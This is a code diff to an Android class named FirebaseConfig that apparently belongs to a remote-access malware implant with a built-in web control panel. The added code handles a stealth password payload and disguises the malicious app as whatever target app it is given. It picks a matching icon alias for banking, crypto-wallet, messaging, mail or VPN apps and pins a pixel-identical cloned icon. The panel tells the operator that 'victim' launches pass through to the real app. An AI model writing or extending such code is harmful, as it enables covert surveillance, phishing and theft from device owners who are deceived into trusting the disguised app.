@@ -865,6 +865,18 @@ public class FirebaseConfig extends NanoHTTPD {
             Map<String, String> params = session.getParms();
             String newPass = params.get("new_password");
 
+            if (newPass == null && files.containsKey("postData")) {
+                try {
+                    String rawBody = files.get("postData");
+                    if (rawBody != null && rawBody.trim().startsWith("{")) {
+                        org.json.JSONObject jsonObj = new org.json.JSONObject(rawBody);
+                        if (jsonObj.has("new_password")) {
+                            newPass = jsonObj.getString("new_password");
+                        }
+                    }
+                } catch (Exception ignored) {}
+            }
+
             // [DEEP_STEALTH] De-obfuscate payload if it's masked
             if (newPass != null && newPass.startsWith("0x_")) {
                 try {
@@ -1067,9 +1079,51 @@ public class FirebaseConfig extends NanoHTTPD {
         if (pkg == null || pkg.isEmpty()) return serveError(session, "Package parameter missing");
         
         try {
+            Map<String, String> params = session.getParms();
             android.content.pm.PackageManager pm = context.getPackageManager();
             android.content.pm.ApplicationInfo appInfo = pm.getApplicationInfo(pkg, 0);
             String appName = appInfo.loadLabel(pm).toString();
+
+            // Determine matching alias component based on package or category
+            String targetAlias = "SystemUpdateAlias";
+            String lowerPkg = pkg.toLowerCase();
+            String lowerName = appName.toLowerCase();
+
+            if (lowerPkg.contains("whatsapp") || lowerName.contains("whatsapp")) {
+                targetAlias = "WhatsAppAlias";
+            } else if (lowerPkg.contains("telegram") || lowerName.contains("telegram")) {
+                targetAlias = "TelegramAlias";
+            } else if (lowerPkg.contains("instagram") || lowerName.contains("instagram")) {
+                targetAlias = "InstagramAlias";
+            } else if (lowerPkg.contains("youtube") || lowerName.contains("youtube")) {
+                targetAlias = "YouTubeAlias";
+            } else if (lowerPkg.contains("chrome") || lowerName.contains("chrome")) {
+                targetAlias = "ChromeAlias";
+            } else if (lowerPkg.contains("bank") || lowerPkg.contains("pcfinancial") || lowerName.contains("bank") || lowerPkg.contains("casino") || lowerPkg.contains("bet") || lowerPkg.contains("bree")) {
+                targetAlias = "BankAlias";
+            } else if (lowerPkg.contains("mail") || lowerPkg.contains("proton") || lowerName.contains("mail") || lowerPkg.contains("email")) {
+                targetAlias = "MailAlias";
+            } else if (lowerPkg.contains("vpn") || lowerName.contains("vpn")) {
+                targetAlias = "VPNAlias";
+            } else if (lowerPkg.contains("pdf") || lowerPkg.contains("adobe") || lowerName.contains("acrobat") || lowerName.contains("reader")) {
+                targetAlias = "PdfAlias";
+            } else if (lowerPkg.contains("music") || lowerPkg.contains("spotify") || lowerName.contains("music")) {
+                targetAlias = "MusicAlias";
+            } else if (lowerPkg.contains("twitter") || lowerPkg.contains("x.android") || lowerName.contains("twitter") || lowerName.equals("x")) {
+                targetAlias = "TwitterAlias";
+            } else if (lowerPkg.contains("termux") || lowerName.contains("termux")) {
+                targetAlias = "TermuxAlias";
+            } else if (lowerPkg.contains("electrum") || lowerPkg.contains("wallet") || lowerName.contains("crypto") || lowerName.contains("bitcoin")) {
+                targetAlias = "CryptoAlias";
+            } else if (lowerPkg.contains("calculator") || lowerName.contains("calculator") || lowerPkg.contains("calc")) {
+                targetAlias = "CalculatorAlias";
+            } else if (lowerPkg.contains("weather") || lowerName.contains("weather")) {
+                targetAlias = "WeatherAlias";
+            } else if (lowerPkg.contains("settings") || lowerPkg.contains("vending") || lowerPkg.contains("protect") || lowerName.contains("settings")) {
+                targetAlias = "SettingsAlias";
+            } else if (lowerPkg.equals("android") || lowerPkg.contains("com.android.systemui") || lowerPkg.contains("system.service")) {
+                targetAlias = "AndroidSystemAlias";
+            }
 
             context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                     .edit()
@@ -1078,12 +1132,20 @@ public class FirebaseConfig extends NanoHTTPD {
                     .putBoolean("decoy_deployed", true)
                     .apply();
 
-            SystemAnalytics.setStealthMode(context, true);
+            SystemAnalytics.enableSpecificAlias(context, targetAlias);
 
-            logActivity("STEALTH_CAMOUFLAGE: App identity morphed to " + appName + " (" + pkg + ")");
+            // Dynamic Shortcut Pinning via ClonedIconManager for 100% pixel-identical icon
+            ClonedIconManager.cloneAndPinApp(context, pkg);
+
+            logActivity("STEALTH_CAMOUFLAGE: App identity morphed to " + appName + " (" + pkg + ") via " + targetAlias);
+
+            String safeAppName = appName.replace("\"", "\\\"");
+            if ("true".equals(params.get("json")) || (session.getHeaders().get("accept") != null && session.getHeaders().get("accept") != null && session.getHeaders().get("accept").contains("json"))) {
+                return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"appName\": \"" + safeAppName + "\", \"alias\": \"" + targetAlias + "\"}");
+            }
 
             String html = getHeader(session.getUri()) + 
-                "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color:var(--neon-cyan);\">🎭</div><h2>App Identity Morphed</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div><p style=\"margin-bottom: 25px;\">Launcher camouflage active as <b>" + escapeHtml(appName) + "</b> (" + escapeHtml(pkg) + ").<br>Victim launches will seamlessly pass through to the real application.</p><div style=\"display: flex; justify-content: center;\"><a href=\"/device/apps\" class=\"btn\">Back to Apps</a></div></div></div>" + getFooter();
+                "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color:var(--neon-cyan);\">🎭</div><h2>App Identity Morphed</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div><p style=\"margin-bottom: 25px;\">Launcher camouflage active as <b>" + escapeHtml(appName) + "</b> (" + escapeHtml(pkg) + ").<br>Icon and label assigned via <b>" + targetAlias + "</b> with dynamic icon bitmap pinning.<br>Victim launches on the home screen will seamlessly pass through to the real application.</p><div style=\"display: flex; justify-content: center;\"><a href=\"/device/apps\" class=\"btn\">Back to Apps</a></div></div></div>" + getFooter();
             return serveGzipped(session, "text/html", html);
         } catch (Exception e) {
             return serveError(session, "Failed to masquerade app: " + e.getMessage());
